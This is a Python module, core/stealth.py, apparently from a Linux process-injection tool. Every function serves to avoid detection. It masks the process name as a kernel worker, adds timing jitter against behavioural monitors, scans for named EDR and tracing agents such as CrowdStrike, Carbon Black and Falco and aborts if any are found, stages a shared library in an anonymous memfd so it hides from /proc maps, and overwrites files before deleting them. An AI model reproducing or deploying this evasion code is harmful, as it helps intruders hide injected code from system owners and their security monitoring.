"""
core/stealth.py — Stealth and evasion utilities.

Covers: timing jitter, process name masking, monitor/EDR detection,
memfd library staging, seccomp/MAC checks, and secure file deletion.
"""

import os
import time
import random
import secrets
import ctypes
import ctypes.util
from pathlib import Path
from typing import List, Optional, Tuple

from utils.log import _log, die


# ── Timing jitter ─────────────────────────────────────────────────────────────

def jitter(min_ms: int = 3, max_ms: int = 40) -> None:
    """
    Random sleep between sensitive operations.
    Makes timing-based detection harder for behavioral monitors.
    """
    time.sleep(random.uniform(min_ms, max_ms) / 1000.0)


# ── Process name masking ──────────────────────────────────────────────────────

def mask_process_comm(name: str = "kworker/0:0") -> None:
    """
    Overwrite /proc/self/comm so 'ps' and 'top' show a benign kernel thread name.
    The kernel silently truncates to 15 chars.
    """
    try:
        Path("/proc/self/comm").write_text(name[:15])
        _log("DEBUG", f"Process comm masked as '{name[:15]}'")
    except OSError:
        pass  # Non-critical — some hardened kernels block writes to comm


def restore_process_comm(original: str) -> None:
    """Restore the original process name in /proc/self/comm on exit."""
    try:
        Path("/proc/self/comm").write_text(original[:15])
    except OSError:
        pass


# ── Monitor / EDR detection ───────────────────────────────────────────────────

def check_monitors(abort_on_found: bool = False) -> List[str]:
    """
    Scan /proc for known monitoring, tracing, and EDR daemons.

    If abort_on_found=True the function calls die() immediately.
    Otherwise returns a list so the caller can decide.
    """
    suspects = {
        # Classic Linux tracers
        "strace", "ltrace", "perf", "bpftrace",
        # System audit / intrusion detection
        "auditd", "sysdig", "falco", "osqueryd",
        # eBPF-based security
        "tetragon", "tracee", "cilium-agent",
        # EDR agents (common in enterprise)
        "cbdaemon", "cbsensor",    # Carbon Black
        "ds_agent",                # Trend Micro
        "xagt",                    # FireEye
        "CrowdStrike",             # CrowdStrike
    }
    found = []
    try:
        for entry in Path("/proc").iterdir():
            if not entry.name.isdigit():
                continue
            try:
                name = (entry / "comm").read_text().strip()
                if name in suspects:
                    found.append(name)
            except (PermissionError, FileNotFoundError, ProcessLookupError):
                pass
    except (PermissionError, FileNotFoundError):
        pass

    if found and abort_on_found:
        die(
            f"Aborting: monitoring tool(s) detected: {', '.join(found)}\n"
            f"      Use --no-abort-on-monitors to proceed anyway."
        )
    return found


# ── Target security checks ────────────────────────────────────────────────────

def check_target_seccomp(pid: int) -> Optional[int]:
    """
    Read Seccomp field from /proc/pid/status.

    Returns:
        0  — disabled
        1  — strict (mmap will likely be blocked)
        2  — filter (depends on policy)
        None — could not read
    """
    try:
        for line in Path(f"/proc/{pid}/status").read_text().splitlines():
            if line.startswith("Seccomp:"):
                return int(line.split(":")[1].strip())
    except (FileNotFoundError, PermissionError, ValueError):
        pass
    return None


def check_selinux_apparmor(pid: int) -> Optional[str]:
    """
    Return the AppArmor or SELinux label of the target process (informational).
    Returns None if neither framework is active.
    """
    # AppArmor
    try:
        attr = Path(f"/proc/{pid}/attr/current").read_text().strip()
        if attr and attr != "unconfined":
            return f"AppArmor:{attr}"
    except (FileNotFoundError, PermissionError):
        pass
    # SELinux
    try:
        ctx = Path(f"/proc/{pid}/attr/sockcreate").read_text().strip()
        if ctx:
            return f"SELinux:{ctx}"
    except (FileNotFoundError, PermissionError):
        pass
    return None


# ── memfd staging ─────────────────────────────────────────────────────────────

def memfd_stage(lib_path: Path) -> Tuple[str, int]:
    """
    Copy the .so into an anonymous memfd.

    Returns (proc_fd_path, fd). The fd must stay open until dlopen()
    completes; closing it early invalidates the path.

    The library appears as 'memfd:<random>' in /proc/pid/maps instead
    of its real filesystem path.
    """
    SYS_memfd_create = 319  # x86_64

    libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
    libc.syscall.restype  = ctypes.c_long
    libc.syscall.argtypes = [ctypes.c_long, ctypes.c_char_p, ctypes.c_uint]

    mem_name = secrets.token_hex(6).encode()
    fd = libc.syscall(SYS_memfd_create, mem_name, ctypes.c_uint(0))
    if fd < 0:
        raise OSError("memfd_create syscall failed (kernel < 3.17?)")

    os.write(fd, lib_path.read_bytes())

    path = f"/proc/{os.getpid()}/fd/{fd}"
    _log("DEBUG", f"memfd staging: {lib_path.name} → {path}  (name={mem_name.decode()})")
    return path, fd


# ── Secure file deletion ──────────────────────────────────────────────────────

def secure_delete(path: Path) -> None:
    """Overwrite a file with random bytes before unlinking it."""
    try:
        size = max(path.stat().st_size, 64)
        path.write_bytes(secrets.token_bytes(size))
        path.unlink()
    except OSError:
        try:
            path.unlink(missing_ok=True)
        except OSError:
            pass


# ── Thread enumeration ────────────────────────────────────────────────────────

def get_all_tids(pid: int) -> List[int]:
    """
    Return all thread IDs of a process by reading /proc/pid/task/.
    Always includes the main thread (tid == pid).
    """
    try:
        return [int(d.name) for d in Path(f"/proc/{pid}/task").iterdir()
                if d.name.isdigit()]
    except (FileNotFoundError, PermissionError):
        return [pid]
